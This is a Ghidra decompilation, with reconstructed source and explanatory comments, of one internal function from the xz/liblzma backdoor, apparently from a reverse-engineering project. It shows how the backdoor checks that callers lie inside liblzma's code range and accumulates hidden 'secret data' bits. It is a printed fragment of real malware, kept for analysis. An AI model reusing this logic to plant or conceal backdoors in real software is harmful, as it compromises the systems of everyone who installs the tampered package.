// /home/kali/xzre-ghidra/xzregh/10AAC0_secret_data_append_singleton.c
// Function: secret_data_append_singleton @ 0x10AAC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall secret_data_append_singleton(u8 * call_site, u8 * code, secret_data_shift_cursor_t shift_cursor, uint shift_count, uint operation_index)


/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief Shifts data in the secret data store, after validation of @p code.
 *   this function is intended to be invoked only once for each @p operation_index value.
 *   @p operation_index will be used as an index into a global array of flags,
 *   so that multiple calls with the same value will be a NO-OP.
 *
 *   the @p code will be verified to check if the shift operation should be allowed or not.
 *   the algorithm will:
 *   - locate the beginning of the function, by scanning for the `endbr64` instruction
 *   and making sure that the code lies between a pre-defined code range (set in @ref backdoor_setup from @ref elf_get_code_segment)
 *   - search for @p shift_count number of "reg2reg" instructions (explained below)
 *   - for each instruction, shift a '1' in the data register, and increment the shift cursor to the next bit index
 *   the code only considers reg2reg instruction. other instructions are skipped.
 *   the function will return TRUE if the number of shifts executed == number of wanted shifts
 *   (that is, if there are as many compatible reg2reg instructions as the number of requested shifts)
 *   NOTE: MOV instructions are counted, but don't cause any shift (they are skipped).
 *
 *   a reg2reg instruction is an x64 instruction with one of the following characteristics:
 *   - primary opcode of 0x89 (MOV) or 0x3B (CMP)
 *   or, alternatively, an opcode that passes the following validation
 *   opcode_check = opcode - 0x83;
 *   if ( opcode_check > 0x2E || ((0x410100000101 >> opcode_value) & 1) == 0 )
 *
 *   additionally, checks outlined in @ref find_reg2reg_instruction must also pass
 *   NOTE: the opcode in 'opcode' is the actual opcode +0x80
 *   TODO: inspect x64 manual to find the exact filter
 *
 *   if @p call_site is supplied, a preliminary check will be conducted to see if the caller function
 *   contains a CALL-relative instruction.
 *   several functions have a CALL in the prologue which serves a dual purpose:
 *   - push more data in the secret data store
 *   - check if the call is authorized (the code is in the authorized range, and starts with a CALL-relative instruction)
 *
 *
 *   @param call_site if supplied, it will be checked if it contains a valid CALL-relative instruction
 *   @param code pointer to code that will be checked by the function, to "authorize" the data load
 *   @param shift_cursor the initial shift index
 *   @param shift_count number of '1' bits to shift, represented by the number of"reg2reg" instructions expected in the function pointed to by @p code
 *   @param operation_index index/id of shit shift operation
 *   @return BOOL TRUE if all requested shifts were all executed.
 *   FALSE if some shift wasn't executed due to code validation failure.
 *
 * Upstream implementation excerpt (xzre/xzre_code/secret_data_append_singleton.c):
 *     BOOL secret_data_append_singleton(
 *     	u8 *call_site, u8 *code,
 *     	secret_data_shift_cursor_t shift_cursor,
 *     	unsigned shift_count, unsigned operation_index
 *     ){
 *     	if(global_ctx && !global_ctx->shift_operations[operation_index]){
 *     		global_ctx->shift_operations[operation_index] = TRUE;
 *     		void *func_start = NULL;
 *     		if(!find_function(
 *     			code, &func_start, NULL,
 *     			global_ctx->lzma_code_start,
 *     			global_ctx->lzma_code_end,
 *     			FIND_NOP
 *     		)){
 *     			return FALSE;
 *     		}
 *     
 *     		if(!secret_data_append_from_code(
 *     			func_start, global_ctx->lzma_code_end,
 *     			shift_cursor, shift_count,
 *     			call_site == NULL
 *     		)){
 *     			return FALSE;
 *     		}
 *     
 *     		global_ctx->num_shifted_bits += shift_count;
 *     	}
 *     	return TRUE;
 *     }
 */

BOOL secret_data_append_singleton
               (u8 *call_site,u8 *code,secret_data_shift_cursor_t shift_cursor,uint shift_count,
               uint operation_index)

{
  long lVar1;
  BOOL BVar2;
  void *local_30 [2];
  
  lVar1 = global_ctx;
  local_30[0] = (void *)0x0;
  if ((global_ctx == 0) || (*(char *)(global_ctx + 0x141 + (ulong)operation_index) != '\0')) {
LAB_0010ab60:
    BVar2 = 1;
  }
  else {
    *(undefined1 *)(global_ctx + 0x141 + (ulong)operation_index) = 1;
    BVar2 = find_function(code,local_30,(void **)0x0,*(u8 **)(lVar1 + 0x80),*(u8 **)(lVar1 + 0x88),
                          FIND_NOP);
    if (BVar2 != 0) {
      BVar2 = secret_data_append_from_code
                        (local_30[0],*(void **)(global_ctx + 0x88),shift_cursor,shift_count,
                         (uint)(call_site == (u8 *)0x0));
      if (BVar2 != 0) {
        *(int *)(global_ctx + 0x160) = *(int *)(global_ctx + 0x160) + shift_count;
        goto LAB_0010ab60;
      }
    }
    BVar2 = 0;
  }
  return BVar2;
}

